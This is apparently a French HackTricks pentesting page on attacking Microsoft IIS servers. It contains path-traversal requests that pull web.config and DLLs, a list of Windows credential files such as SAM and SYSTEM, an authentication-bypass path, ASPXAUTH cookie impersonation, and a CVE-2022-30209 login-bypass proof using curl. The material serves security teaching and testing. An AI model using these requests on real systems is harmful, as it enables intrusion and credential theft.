# IIS - Internet Information Services

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

Testez les extensions de fichiers ex√©cutables :

* asp
* aspx
* config
* php

## Divulgation de l'adresse IP interne

Sur tout serveur IIS o√π vous obtenez un 302, vous pouvez essayer de supprimer l'en-t√™te Host et d'utiliser HTTP/1.0 et √† l'int√©rieur de la r√©ponse, l'en-t√™te Location pourrait vous indiquer l'adresse IP interne :
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
R√©ponse divulguant l'IP interne :
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## Ex√©cuter des fichiers .config

Vous pouvez t√©l√©charger des fichiers .config et les utiliser pour ex√©cuter du code. Une fa√ßon de le faire est d'ajouter le code √† la fin du fichier √† l'int√©rieur d'un commentaire HTML : [T√©l√©charger l'exemple ici](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Plus d'informations et de techniques pour exploiter cette vuln√©rabilit√© [ici](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## D√©couverte IIS Bruteforce

T√©l√©chargez la liste que j'ai cr√©√©e :

{% file src="../../.gitbook/assets/iisfinal.txt" %}

Elle a √©t√© cr√©√©e en fusionnant le contenu des listes suivantes :

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

Utilisez-le sans ajouter d'extension, les fichiers qui en ont besoin l'ont d√©j√†.

## Travers√©e de chemin

### Fuite de code source

Consultez l'int√©gralit√© de l'article ici : [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
En r√©sum√©, il y a plusieurs fichiers web.config √† l'int√©rieur des dossiers de l'application avec des r√©f√©rences aux fichiers "**assemblyIdentity**" et "**namespaces**". Avec ces informations, il est possible de savoir **o√π se trouvent les ex√©cutables** et de les t√©l√©charger.\
√Ä partir des **Dlls t√©l√©charg√©s**, il est √©galement possible de trouver **de nouveaux namespaces** o√π vous devriez essayer d'acc√©der et obtenir le fichier web.config afin de trouver de nouveaux namespaces et assemblyIdentity.\
De plus, les fichiers **connectionstrings.config** et **global.asax** peuvent contenir des informations int√©ressantes.\\
{% endhint %}

Dans les **applications .Net MVC**, le fichier **web.config** joue un r√¥le crucial en sp√©cifiant chaque fichier binaire sur lequel l'application repose √† travers des balises XML **"assemblyIdentity"**.

### **Exploration des fichiers binaires**

Un exemple d'acc√®s au fichier **web.config** est montr√© ci-dessous :
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
Cette requ√™te r√©v√®le divers param√®tres et d√©pendances, tels que :

* **EntityFramework** version
* **AppSettings** pour les pages web, la validation des clients et JavaScript
* Configurations **System.web** pour l'authentification et l'ex√©cution
* Param√®tres des modules **System.webServer**
* Liaisons d'assemblage **Runtime** pour de nombreuses biblioth√®ques comme **Microsoft.Owin**, **Newtonsoft.Json** et **System.Web.Mvc**

Ces param√®tres indiquent que certains fichiers, tels que **/bin/WebGrease.dll**, se trouvent dans le dossier /bin de l'application.

### **Fichiers du R√©pertoire Racine**

Les fichiers trouv√©s dans le r√©pertoire racine, comme **/global.asax** et **/connectionstrings.config** (qui contient des mots de passe sensibles), sont essentiels pour la configuration et le fonctionnement de l'application.

### **Espaces de Noms et Web.Config**

Les applications MVC d√©finissent √©galement des **fichiers web.config** suppl√©mentaires pour des espaces de noms sp√©cifiques afin d'√©viter des d√©clarations r√©p√©titives dans chaque fichier, comme le montre une requ√™te pour t√©l√©charger un autre **web.config** :
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **T√©l√©chargement de DLLs**

La mention d'un espace de noms personnalis√© sugg√®re qu'il existe une DLL nomm√©e "**WebApplication1**" pr√©sente dans le r√©pertoire /bin. Suite √† cela, une demande de t√©l√©chargement de la **WebApplication1.dll** est montr√©e :
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
Cela sugg√®re la pr√©sence d'autres DLL essentielles, comme **System.Web.Mvc.dll** et **System.Web.Optimization.dll**, dans le r√©pertoire /bin.

Dans un sc√©nario o√π une DLL importe un espace de noms appel√© **WebApplication1.Areas.Minded**, un attaquant pourrait d√©duire l'existence d'autres fichiers web.config dans des chemins pr√©visibles, tels que **/area-name/Views/**, contenant des configurations sp√©cifiques et des r√©f√©rences √† d'autres DLL dans le dossier /bin. Par exemple, une requ√™te √† **/Minded/Views/web.config** peut r√©v√©ler des configurations et des espaces de noms qui indiquent la pr√©sence d'une autre DLL, **WebApplication1.AdditionalFeatures.dll**.

### Fichiers courants

Depuis [ici](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 Erreur 404

Si vous voyez une erreur comme celle-ci :

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

Cela signifie que le serveur **n'a pas re√ßu le bon nom de domaine** dans l'en-t√™te Host.\
Pour acc√©der √† la page web, vous pourriez jeter un ≈ìil au **certificat SSL** servi et peut-√™tre que vous pourrez y trouver le nom de domaine/sous-domaine. S'il n'est pas l√†, vous devrez peut-√™tre **forcer les VHosts** jusqu'√† ce que vous trouviez le bon.

## Anciennes vuln√©rabilit√©s IIS √† rechercher

### Vuln√©rabilit√©/Fonctionnalit√© du caract√®re tilde ‚Äú\~‚Äù de Microsoft IIS ‚Äì Divulgation de noms de fichiers/dossiers courts

Vous pouvez essayer d'**√©num√©rer les dossiers et fichiers** √† l'int√©rieur de chaque dossier d√©couvert (m√™me s'il n√©cessite une authentification de base) en utilisant cette **technique**.\
La principale limitation de cette technique si le serveur est vuln√©rable est qu'elle **ne peut trouver que les 6 premi√®res lettres du nom de chaque fichier/dossier et les 3 premi√®res lettres de l'extension** des fichiers.

Vous pouvez utiliser [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) pour tester cette vuln√©rabilit√© : `java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (844).png>)

Recherche originale : [https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

Vous pouvez √©galement utiliser **metasploit** : `use scanner/http/iis_shortname_scanner`

### Contournement de l'authentification de base

**Contourner** une authentification de base (**IIS 7.5**) en essayant d'acc√©der √† : `/admin:$i30:$INDEX_ALLOCATION/admin.php` ou `/admin::$INDEX_ALLOCATION/admin.php`

Vous pouvez essayer de **m√©langer** cette **vuln√©rabilit√©** et la derni√®re pour trouver de nouveaux **dossiers** et **contourner** l'authentification.

## D√©bogage ASP.NET Trace.AXD activ√©

ASP.NET inclut un mode de d√©bogage et son fichier s'appelle `trace.axd`.

Il conserve un journal tr√®s d√©taill√© de toutes les requ√™tes faites √† une application sur une p√©riode de temps.

Ces informations incluent les IP des clients distants, les ID de session, tous les cookies de requ√™te et de r√©ponse, les chemins physiques, les informations sur le code source, et potentiellement m√™me les noms d'utilisateur et mots de passe.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Capture d'√©cran 2021-03-30 √† 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## Cookie ASPXAUTH

ASPXAUTH utilise les informations suivantes :

* **`validationKey`** (cha√Æne) : cl√© encod√©e en hexad√©cimal √† utiliser pour la validation de signature.
* **`decryptionMethod`** (cha√Æne) : (par d√©faut ‚ÄúAES‚Äù).
* **`decryptionIV`** (cha√Æne) : vecteur d'initialisation encod√© en hexad√©cimal (par d√©faut un vecteur de z√©ros).
* **`decryptionKey`** (cha√Æne) : cl√© encod√©e en hexad√©cimal √† utiliser pour le d√©chiffrement.

Cependant, certaines personnes utiliseront les **valeurs par d√©faut** de ces param√®tres et utiliseront comme **cookie l'email de l'utilisateur**. Par cons√©quent, si vous pouvez trouver un site web utilisant la **m√™me plateforme** qui utilise le cookie ASPXAUTH et que vous **cr√©ez un utilisateur avec l'email de l'utilisateur que vous souhaitez usurper** sur le serveur attaqu√©, vous pourrez peut-√™tre **utiliser le cookie du deuxi√®me serveur dans le premier** et usurper l'utilisateur.\
Cette attaque a fonctionn√© dans ce [**writeup**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19).

## Contournement de l'authentification IIS avec des mots de passe mis en cache (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[Rapport complet ici](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html) : Un bug dans le code **n'a pas correctement v√©rifi√© le mot de passe donn√© par l'utilisateur**, donc un attaquant dont le **hash du mot de passe correspond √† une cl√©** d√©j√† dans le **cache** pourra se connecter en tant que cet utilisateur.
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team GCP (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
